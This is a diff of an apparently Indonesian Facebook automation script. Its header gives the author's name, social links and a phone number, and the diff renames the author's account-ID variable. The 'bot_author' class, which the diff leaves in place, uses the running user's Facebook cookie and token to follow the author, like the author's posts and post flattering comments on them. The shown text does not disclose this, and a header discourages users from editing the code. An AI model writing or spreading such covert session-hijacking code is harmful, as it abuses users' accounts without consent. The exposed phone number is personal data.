@@ -1,4 +1,7 @@
 ###----------[ AUTHOR & CREATOR ]---------- ###
+Dnventa = 100013275378835
+Postingan = 1624764771309353
+###----------[ AUTHOR & CREATOR ]---------- ###
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
 Author    = 'Denventa Afriliyan Ferly Khurayra Shishigami X'
 Facebook  = 'Facebook.com/Denventa.Afriliyan'
@@ -7,7 +10,6 @@ Whatsapp  = '085797818026'
 YouTube   = 'Youtube.com/channel/'
 Version   = '0.4'
 Denventa  = 100013275378835
-Postingan = 1624764771309353
 
 ###----------[ IMPORT LIBRARY ]---------- ###
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser,base64
@@ -165,7 +167,7 @@ def kecuali(error):
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Keren Master\n- [ @[100013275378835:0] ] -','Semangat Terus Master\n- [ @[100013275378835:0] ] -','Gokil Suhu','Panutanku Nih Bro\n- [ @[100013275378835:0] ] -']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Dnventa)];self.komen = ['Keren Master\n- [ @[100013275378835:0] ] -','Semangat Terus Master\n- [ @[100013275378835:0] ] -','Gokil Suhu','Panutanku Nih Bro\n- [ @[100013275378835:0] ] -']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
